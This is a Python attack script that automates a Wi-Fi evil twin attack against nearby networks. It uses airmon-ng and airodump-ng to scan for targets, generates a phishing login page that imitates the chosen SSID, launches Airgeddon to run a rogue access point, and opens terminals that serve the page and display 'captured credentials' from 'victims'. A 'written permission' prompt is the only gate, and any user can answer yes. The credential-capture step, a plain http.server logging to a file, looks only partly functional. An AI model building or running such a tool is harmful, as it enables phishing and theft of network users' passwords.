#!/usr/bin/env python3
"""
CyberWolf Evil Twin AI - Universal Terminal Version
Works with any terminal (xterm, gnome-terminal, etc.)
"""

import subprocess
import os
import time

def clear_screen():
    os.system('clear')

def banner():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║            🐺 CYBERWOLF AI EVIL TWIN FRAMEWORK 🐺               ║
║         ⚠️  AUTHORIZED USE ONLY ⚠️                             ║
╚══════════════════════════════════════════════════════════════════╝
    """)

def check_permission():
    print("\n[!] LEGAL REQUIREMENT")
    print("This tool is for EDUCATIONAL and AUTHORIZED testing only.\n")
    answer = input("Do you have written permission to test? (yes/no): ")
    if answer.lower() not in ['yes', 'y']:
        print("\n[!] Authorization required. Exiting.")
        return False
    return True

def start_monitor_mode():
    print("\n[*] Starting monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
    result = subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], capture_output=True)
    if result.returncode == 0:
        print("[+] Monitor mode active on wlan0mon")
        return True
    else:
        print("[-] Failed to start monitor mode")
        return False

def scan_networks():
    print("\n[*] Scanning for networks (15 seconds)...")
    
    scan_process = subprocess.Popen(
        ["sudo", "airodump-ng", "wlan0mon", "--write", "/tmp/scan", "--output-format", "csv"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    for i in range(15):
        print(f"\r[*] Scanning... {15-i} seconds remaining", end="")
        time.sleep(1)
    
    scan_process.terminate()
    time.sleep(2)
    print("\n[+] Scan complete!")
    
    networks = []
    try:
        with open("/tmp/scan-01.csv", "r") as f:
            lines = f.readlines()
        
        for line in lines:
            if "WPA" in line or "WEP" in line or "OPEN" in line:
                parts = line.split(',')
                if len(parts) >= 14:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip() if len(parts) > 13 else "Hidden"
                    if bssid and bssid != "BSSID" and essid and essid != "":
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid
                        })
    except:
        pass
    
    if networks:
        print("\n[+] Available Networks:")
        print("-" * 60)
        for i, net in enumerate(networks[:10]):
            print(f"  {i+1}. {net['essid']} (Channel {net['channel']}) - {net['bssid']}")
        print("-" * 60)
    else:
        print("\n[-] No networks found.")
    
    return networks

def generate_phishing_page(ssid):
    os.makedirs("portals", exist_ok=True)
    
    html = f'''<!DOCTYPE html>
<html>
<head>
    <title>{ssid} Authentication</title>
    <style>
        body {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
            width: 350px;
        }}
        h2 {{ color: #333; margin-bottom: 20px; }}
        input {{
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }}
        button {{
            width: 100%;
            padding: 10px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }}
        button:hover {{ background: #45a049; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 {ssid} Portal</h2>
        <p>Please sign in to continue using the network.</p>
        <form action="/capture" method="POST">
            <input type="text" name="username" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <p style="margin-top: 20px; font-size: 12px; color: #999; text-align: center;">
            🔒 Secure Connection
        </p>
    </div>
</body>
</html>'''
    
    filename = f"portals/{ssid.replace(' ', '_')}.html"
    with open(filename, 'w') as f:
        f.write(html)
    
    print(f"[+] Phishing page saved: {filename}")
    return filename

def get_terminal_command():
    """Find available terminal emulator"""
    terminals = [
        ('xterm', ['xterm', '-e']),
        ('gnome-terminal', ['gnome-terminal', '--']),
        ('terminator', ['terminator', '-e']),
        ('konsole', ['konsole', '-e']),
        ('mate-terminal', ['mate-terminal', '-e']),
        ('xfce4-terminal', ['xfce4-terminal', '-e']),
    ]
    
    for name, cmd in terminals:
        if subprocess.run(['which', name], capture_output=True).returncode == 0:
            return cmd
    return None

def open_terminals_universal(target_essid):
    """Open terminals using available terminal emulator"""
    
    home_dir = os.path.expanduser("~")
    portal_dir = f"{home_dir}/cyberwolf-evil-twin/portals"
    
    term_cmd = get_terminal_command()
    
    if not term_cmd:
        print("[-] No terminal emulator found!")
        print("\n[!] Please manually open 3 terminals and run:")
        print(f"\nTerminal 1: sudo airgeddon")
        print(f"Terminal 2: cd {portal_dir} && sudo python3 -m http.server 80")
        print(f"Terminal 3: watch -n 2 'tail -20 {portal_dir}/captured.txt 2>/dev/null || echo \"Waiting...\"'")
        return False
    
    # Create script files
    script1 = f'''#!/bin/bash
echo "════════════════════════════════════════════════════════════"
echo "🐺 TERMINAL 1 - EVIL TWIN AP"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Target: {target_essid}"
echo ""
echo "In Airgeddon:"
echo "1. Select interface: wlan0mon"
echo "2. Choose 'Evil Twin Attacks'"
echo "3. Select target: {target_essid}"
echo ""
echo "Launching Airgeddon..."
sleep 2
sudo airgeddon
'''
    
    script2 = f'''#!/bin/bash
echo "════════════════════════════════════════════════════════════"
echo "🐺 TERMINAL 2 - PHISHING SERVER"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Serving phishing page for: {target_essid}"
echo "Port: 80"
echo ""
cd {portal_dir}
sudo python3 -m http.server 80 2>&1 | tee -a captured.txt
'''
    
    script3 = f'''#!/bin/bash
echo "════════════════════════════════════════════════════════════"
echo "🐺 TERMINAL 3 - CREDENTIAL MONITOR"
echo "════════════════════════════════════════════════════════════"
echo ""
while true; do
    clear
    echo "════════════════════════════════════════════════════════════"
    echo "🐺 CAPTURED CREDENTIALS"
    echo "════════════════════════════════════════════════════════════"
    echo ""
    if [ -f {portal_dir}/captured.txt ]; then
        tail -20 {portal_dir}/captured.txt
    else
        echo "Waiting for victims to connect..."
    fi
    echo ""
    echo "────────────────────────────────────────────────────────────"
    sleep 3
done
'''
    
    # Save scripts
    with open("/tmp/term1.sh", "w") as f:
        f.write(script1)
    with open("/tmp/term2.sh", "w") as f:
        f.write(script2)
    with open("/tmp/term3.sh", "w") as f:
        f.write(script3)
    
    os.chmod("/tmp/term1.sh", 0o755)
    os.chmod("/tmp/term2.sh", 0o755)
    os.chmod("/tmp/term3.sh", 0o755)
    
    # Open terminals
    subprocess.Popen(term_cmd + ["/tmp/term1.sh"])
    time.sleep(1)
    subprocess.Popen(term_cmd + ["/tmp/term2.sh"])
    time.sleep(1)
    subprocess.Popen(term_cmd + ["/tmp/term3.sh"])
    
    print(f"[+] Opened 3 terminals using {term_cmd[0]}")
    return True

def stop_monitor_mode():
    print("\n[*] Cleaning up...")
    subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], capture_output=True)
    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True)
    print("[+] Monitor mode stopped")

def main():
    clear_screen()
    banner()
    
    if not check_permission():
        return
    
    if not start_monitor_mode():
        return
    
    networks = scan_networks()
    
    if not networks:
        stop_monitor_mode()
        return
    
    try:
        choice = int(input("\n[?] Select target number: ")) - 1
        target = networks[choice]
    except:
        print("[-] Invalid selection")
        stop_monitor_mode()
        return
    
    print(f"\n[+] Target selected: {target['essid']}")
    
    print("\n[*] AI Generating phishing portal...")
    portal_path = generate_phishing_page(target['essid'])
    
    print("\n[*] Launching attack terminals...")
    open_terminals_universal(target['essid'])
    
    print("\n" + "="*60)
    print("🐺 ATTACK IS RUNNING")
    print("="*60)
    print(f"""
[+] Phishing page: {portal_path}
[+] Target SSID: {target['essid']}
[+] Target Channel: {target['channel']}

3 Terminals opened:
  📟 Terminal 1 - Evil Twin AP (Airgeddon)
  📟 Terminal 2 - Phishing Server (Port 80)
  📟 Terminal 3 - Credential Monitor

Instructions:
1. In Terminal 1, use Airgeddon to create the Evil Twin AP
2. Terminal 2 is serving the phishing page
3. Watch Terminal 3 for captured credentials!
""")
    
    input("\nPress Enter to cleanup and exit...")
    stop_monitor_mode()
    print("\n[+] Cleanup complete. Stay ethical!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        stop_monitor_mode()
